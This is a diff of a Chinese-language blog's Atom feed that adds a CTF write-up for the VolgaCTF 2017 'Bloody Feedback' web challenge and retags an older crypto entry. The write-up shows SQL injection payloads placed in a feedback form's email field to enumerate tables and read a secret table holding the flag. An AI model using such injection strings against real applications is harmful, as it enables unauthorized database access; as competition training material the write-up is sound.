@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://andyw330.github.io/"/>
-  <updated>2017-03-30T16:26:27.000Z</updated>
+  <updated>2017-03-30T18:19:07.000Z</updated>
   <id>https://andyw330.github.io/</id>
   
   <author>
@@ -16,11 +16,47 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>[VolgaCTF 2017 Quals] - Bloody Feedback 100</title>
+    <link href="https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/"/>
+    <id>https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/</id>
+    <published>2017-03-30T16:32:00.000Z</published>
+    <updated>2017-03-30T18:19:07.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="題目資訊"><a href="#題目資訊" class="headerlink" title="題目資訊"></a>題目資訊</h1><blockquote>
+<p>Category: Web<br>Point: 100<br>Description: Send your feedback at <a href="http://bloody-feedback.quals.2017.volgactf.ru" target="_blank" rel="external">bloody-feedback.quals.2017.volgactf.ru</a></p>
+</blockquote>
+<a id="more"></a>
+<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>網站給了一個表單，input欄位分別是 name, email, feedback message，填寫的表單最後會被顯示在公開佈告欄。<br>使用者發送表單後後端會回傳個隨機網址，點進網址可以查看目前feedback message的狀態，看是不是已經被放到公開佈告欄了。</p>
+<p>發送一般的request後，status會顯示<code>not processed</code><br>POST: <code>name=a&amp;email=b&amp;message=c</code><br><img src="/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/original.png" alt="normal request" title="normal request"></p>
+<p>試了一下，在email欄插入<code>&#39;</code>就會造成error，還可以看到各個input欄位分別是甚麼。<br>POST: <code>name=a&amp;email=b&#39;&amp;message=c</code><br><img src="/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/single_quotation.png" alt="with single quotation" title="with single quotation"></p>
+<p>從上面可以分析出來該sql語句應該是<br><code>INSERT INTO … VALUE($code, $name, $message, $email, &#39;not processed&#39;)</code><br>所以只要把最後的<code>not processed</code>部分改插我們想要的東西，再來把後面註解掉，就會顯示出來了！<br>POST: <code>name=a&amp;email=b&#39;, &#39;Hello World!&#39;) --&amp;message=c</code><br><img src="/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/arbitrary_text.png" alt="show arbitrary text" title="show arbitrary text"></p>
+<p>成功了！先拿table<br>POST: <code>name=a&amp;email=b&#39;, (Select table_name from information_schema.tables limit 1 offset 1)) --&amp;message=c</code><br><img src="/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/table.png" alt="show table" title="show table"></p>
+<p>最後拿flag<br>POST: <code>name=a&amp;email=b&#39;, (SELECT * FROM s3cret_tabl3 limit 1 offset 4)) --&amp;message=c</code><br><img src="/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/flag.png" alt="get flag" title="get flag"><br>Flag: <code>VolgaCTF{eiU7UJhyeu@ud3*}</code></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;題目資訊&quot;&gt;&lt;a href=&quot;#題目資訊&quot; class=&quot;headerlink&quot; title=&quot;題目資訊&quot;&gt;&lt;/a&gt;題目資訊&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;Category: Web&lt;br&gt;Point: 100&lt;br&gt;Description: Send your feedback at &lt;a href=&quot;http://bloody-feedback.quals.2017.volgactf.ru&quot;&gt;bloody-feedback.quals.2017.volgactf.ru&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+    
+    </summary>
+    
+      <category term="CTF Write-ups" scheme="https://andyw330.github.io/categories/CTF-Write-ups/"/>
+    
+    
+      <category term="VolgaCTF 2017 Quals" scheme="https://andyw330.github.io/tags/VolgaCTF-2017-Quals/"/>
+    
+      <category term="Web" scheme="https://andyw330.github.io/tags/Web/"/>
+    
+  </entry>
+  
+  <entry>
     <title>[VolgaCTF 2017 Quals] - VC 50</title>
     <link href="https://andyw330.github.io/2017/03/30/VolgaCTF-2017-Quals-VC-50/"/>
     <id>https://andyw330.github.io/2017/03/30/VolgaCTF-2017-Quals-VC-50/</id>
     <published>2017-03-30T09:47:00.000Z</published>
-    <updated>2017-03-30T16:26:27.000Z</updated>
+    <updated>2017-03-30T17:00:14.000Z</updated>
     
     <content type="html"><![CDATA[<h1 id="題目資訊"><a href="#題目資訊" class="headerlink" title="題目資訊"></a>題目資訊</h1><blockquote>
 <p>Category: Crypto<br>Point: 50<br>Description: There are files A.png and B.png. But where’s the flag?</p>
@@ -44,14 +80,14 @@
     
     </summary>
     
-      <category term="Write-ups" scheme="https://andyw330.github.io/categories/Write-ups/"/>
+      <category term="CTF Write-ups" scheme="https://andyw330.github.io/categories/CTF-Write-ups/"/>
     
     
       <category term="VolgaCTF 2017 Quals" scheme="https://andyw330.github.io/tags/VolgaCTF-2017-Quals/"/>
     
       <category term="Crypto" scheme="https://andyw330.github.io/tags/Crypto/"/>
     
-      <category term="Visual cryptography" scheme="https://andyw330.github.io/tags/Visual-cryptography/"/>
+      <category term="Visual Cryptography" scheme="https://andyw330.github.io/tags/Visual-Cryptography/"/>
     
   </entry>
   
